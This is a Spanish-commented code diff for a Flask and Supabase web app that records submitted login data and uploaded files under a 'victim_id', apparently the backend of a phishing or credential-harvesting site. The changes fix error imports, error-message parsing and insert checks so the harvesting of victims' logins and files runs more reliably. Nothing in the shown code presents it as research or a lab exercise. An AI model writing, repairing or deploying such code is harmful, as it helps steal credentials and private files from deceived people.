@@ -4,9 +4,10 @@ import uuid
 import json
 
 from flask import Flask, render_template, request, redirect, url_for, session
-from supabase import create_client, PostgrestAPIError
-# Importamos la librería para manejar la subida de archivos
-from supabase.lib.storage_client import StorageException 
+# --- CORRECCIÓN DE IMPORTACIONES DE ERRORES ---
+# PostgrestAPIError y StorageException se importan directamente desde 'supabase'.
+from supabase import create_client, PostgrestAPIError, StorageException 
+# ---------------------------------------------- 
 
 # --- CONFIGURACIÓN DE LA APLICACIÓN Y SUPABASE ---
 
@@ -27,7 +28,8 @@ try:
 
 except ValueError as e:
     print(f"Error de configuración: {e}")
-except PostgrestAPIError as e:
+    supabase = None
+except PostgrestAPIError as e: # Referencia corregida
     print(f"Error de conexión a Supabase: {e}")
     supabase = None
 except Exception as e:
@@ -75,7 +77,6 @@ def process_login():
             "timestamp": current_timestamp_iso,
             "file_name": "N/A - Archivo aún no subido",
             "file_url": "N/A - Archivo aún no subido",
-            # Inicializamos el campo 'file_data' como NULL o vacío. Supabase lo maneja como NULL.
             "file_data": None 
         }
         
@@ -83,21 +84,28 @@ def process_login():
         response = supabase.table(DB_TABLE).insert(data_to_insert).execute()
         
         # Verificar si la inserción fue exitosa
-        if response.data:
+        if response.data and len(response.data) > 0:
             print(f"Datos de login insertados con ID de víctima: {victim_id}")
             return redirect(url_for('upload_file'))
         else:
             # Si response.data está vacío pero no hubo excepción, puede ser un problema de RLS
             return error_page("Error de Base de Datos", "No se pudo insertar el registro. Verifica las políticas RLS.")
-    except SupabasePostgrestAPIError as e:
-      # Intenta parsear el error para mostrar detalles
+
+    except PostgrestAPIError as e: # Referencia corregida
+        # Intenta parsear el error para mostrar detalles
         try:
-            error_data = json.loads(e.message)
-            return error_page("Error de base de datos o interno.", f"Detalle Técnico: {error_data}")
-        except:
+            # La respuesta de Supabase a menudo viene con un diccionario de errores
+            error_data = json.loads(e.message) 
+            # Verifica si el mensaje de error es amigable para el usuario
+            if 'message' in error_data and 'hint' in error_data:
+                 return error_page("Error de base de datos", f"Detalle Técnico: {error_data['message']} (Sugerencia: {error_data['hint']})")
+            else:
+                 return error_page("Error de Base de Datos", f"Ocurrió un error al insertar los datos: {e.message}")
+
+        except json.JSONDecodeError:
             return error_page("Error de Base de Datos", f"Ocurrió un error al insertar los datos: {e.message}")
-    except Exception as e:
-        return error_page("Error Desconocido", f"Ha ocurrido un error inesperado: {str(e)}")
+        except Exception as e:
+            return error_page("Error Desconocido", f"Ha ocurrido un error inesperado al procesar la excepción: {str(e)}")
 
 
 @app.route('/upload_file', methods=['GET', 'POST'])
@@ -124,7 +132,6 @@ def upload_file():
             original_filename = file.filename
             
             # 2. Generar un nombre de archivo único para Supabase Storage
-            # Usamos el victim_id para prefijar el nombre y garantizar unicidad
             unique_file_name = f"{victim_id}-{original_filename}"
             
             # 3. Subir el archivo a Supabase Storage
@@ -147,19 +154,19 @@ def upload_file():
                 update_data = {
                     "file_name": original_filename,
                     "file_url": public_file_url,
-                    # El campo 'file_data' puede permanecer en NULL/None ya que el archivo está en Storage
                 }
                 
                 update_response = supabase.table(DB_TABLE).update(update_data).eq("victim_id", victim_id).execute()
                 
-                if update_response.data:
+                if update_response.data and len(update_response.data) > 0:
                     return render_template('thank_you.html', filename=original_filename, victim_id=victim_id)
                 else:
-                    return error_page("Error de Base de Datos", "El archivo se subió, pero no se pudo actualizar el registro.")
+                    return error_page("Error de Base de Datos", "El archivo se subió, pero no se pudo actualizar el registro. Verifica las políticas RLS.")
                     
-            except PostgrestAPIError as e:
+            except PostgrestAPIError as e: # Referencia corregida
                  return error_page("Error de Base de Datos", f"Error al actualizar el registro: {e.message}")
             except StorageException as e:
+                # Se maneja el error de almacenamiento con la clase de excepción correcta
                 return error_page("Error de Almacenamiento", f"Error al subir el archivo: {e}")
             except Exception as e:
                 return error_page("Error Desconocido", f"Ha ocurrido un error inesperado durante la carga: {str(e)}")
